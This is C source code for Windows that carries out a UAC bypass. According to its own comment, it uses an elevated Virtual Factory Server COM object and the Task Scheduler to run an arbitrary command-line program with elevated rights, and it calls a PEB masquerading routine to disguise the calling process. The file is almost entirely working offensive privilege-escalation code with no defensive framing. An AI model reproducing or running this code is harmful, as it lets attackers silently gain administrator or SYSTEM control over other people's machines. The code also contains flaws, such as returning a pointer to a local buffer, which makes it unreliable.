#include "header.h"



char* getSid() {

    char userName[260] = "";
    char sid[260] = "";
    DWORD nameSize = sizeof(userName);
    GetUserName((LPSTR)userName, &nameSize);


    char userSID[260] = "";
    char userDomain[260] = "";
    DWORD sidSize = sizeof(userSID);
    DWORD domainSize = sizeof(userDomain);


    SID_NAME_USE snu;
    LookupAccountName(NULL,
        (LPSTR)userName,
        (PSID)userSID,
        &sidSize,
        (LPSTR)userDomain,
        &domainSize,
        &snu);


    PSID_IDENTIFIER_AUTHORITY psia = GetSidIdentifierAuthority(userSID);
    sidSize = sprintf(sid, "S-%lu-", SID_REVISION);
    sidSize += sprintf(sid + strlen(sid), "%-lu", psia->Value[5]);


    int i = 0;
    int subAuthorities = *GetSidSubAuthorityCount(userSID);


    for (i = 0; i < subAuthorities; i++)
    {
        sidSize += sprintf(sid + sidSize, "-%lu", *GetSidSubAuthority(userSID, i));
    }
    //printf("current sid is %s\n", sid);

    return sid;

}
/*
* ucmVirtualFactoryServer
*
* Purpose:
*
* Bypass UAC by using Elevated Factory Server COM object.
*
* 1. Allocate Elevated Factory Server COM object and produce with it help Task Scheduler object.
* 2. Use Task Scheduler object to register task running as LocalSystem.
*
*/
NTSTATUS ucmVirtualFactoryServer(
	_In_ LPWSTR lpszExecutable
)
{
	HRESULT hr_init;
    HRESULT r;
    IElevatedFactoryServer* pElevatedServer = NULL;
    IRegisteredTask* pTask = NULL;
    IRunningTask* pRunningTask = NULL;
    ITaskService* pService = NULL;

    TASK_STATE taskState = TASK_STATE_UNKNOWN;

	hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {
        r = ucmAllocateElevatedObject((LPWSTR)T_CLSID_VirtualFactoryServer,
            &IID_ElevatedFactoryServer,
            CLSCTX_LOCAL_SERVER,
            (VOID**)&pElevatedServer);

        if (r != S_OK)
            break;

        if (pElevatedServer == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        r = pElevatedServer->lpVtbl->ServerCreateElevatedObject(pElevatedServer,
            &CLSID_TaskScheduler,
            &IID_ITaskService,
            (void**)&pService);

        if (r != S_OK)
            break;

        if (pService == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        VARIANT varDummy;
        ITaskFolder* pTaskFolder = NULL;
        BSTR bstrTaskFolder = NULL, bstrTaskName = NULL;
        do {

            bstrTaskFolder = SysAllocString(L"\\");
            if (bstrTaskFolder == NULL)
                break;

            bstrTaskName = SysAllocString(L"Tesk Schedule Task");
            if (bstrTaskName == NULL)
                break;

            VariantInit(&varDummy);

            r = pService->lpVtbl->Connect(pService,
                varDummy,
                varDummy,
                varDummy,
                varDummy);

            if (FAILED(r))
                break;

            r = pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pTaskFolder);
            if (r != S_OK || pTaskFolder == NULL)
                break;

            wchar_t xmlBuffer[4096];
            char* sid = getSid();

            wchar_t wszClassName[256];

            memset(wszClassName, 0, sizeof(wszClassName));

            MultiByteToWideChar(CP_ACP, 0, sid, strlen(sid) + 1, wszClassName, sizeof(wszClassName) / sizeof(wszClassName[0]));

            swprintf(xmlBuffer, 4096, xml, lpszExecutable, wszClassName);

            r = pTaskFolder->lpVtbl->RegisterTask(pTaskFolder, bstrTaskName, SysAllocString(xmlBuffer), 0,
                varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);

            if (r == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {

                r = pTaskFolder->lpVtbl->GetTask(pTaskFolder, bstrTaskName, &pTask);
                if (SUCCEEDED(r)) {

                    pTask->lpVtbl->Stop(pTask, 0);
                    pTask->lpVtbl->Release(pTask);

                    pTaskFolder->lpVtbl->DeleteTask(pTaskFolder, bstrTaskName, 0);
                }

                r = pTaskFolder->lpVtbl->RegisterTask(pTaskFolder, bstrTaskName, SysAllocString(xmlBuffer), 0,
                    varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);
            }

            if (r != S_OK || pTask == NULL)
                break;

            r = pTask->lpVtbl->Run(pTask, varDummy, &pRunningTask);

            if (r != S_OK || pRunningTask == NULL)
                break;

            if (SUCCEEDED(pRunningTask->lpVtbl->get_State(pRunningTask, &taskState))) {

                if (taskState == TASK_STATE_RUNNING) {
                    //printf("Succeed, Wait For Sleep 5s");
                    Sleep(5000);
                }

            }
            //pRunningTask->lpVtbl->Stop(pRunningTask);
            //pTaskFolder->lpVtbl->DeleteTask(pTaskFolder, bstrTaskName, 0);

        } while (FALSE);


    } while (FALSE);
}


int main(int argc, char* argv[]) {


    char* command = argv[1];
    WCHAR wszClassName[256];

    memset(wszClassName, 0, sizeof(wszClassName));

    MultiByteToWideChar(CP_ACP, 0, command, strlen(command) + 1, wszClassName, sizeof(wszClassName) / sizeof(wszClassName[0]));

    MasqueradePEB();
    ucmVirtualFactoryServer(wszClassName);

    

    return 0;
}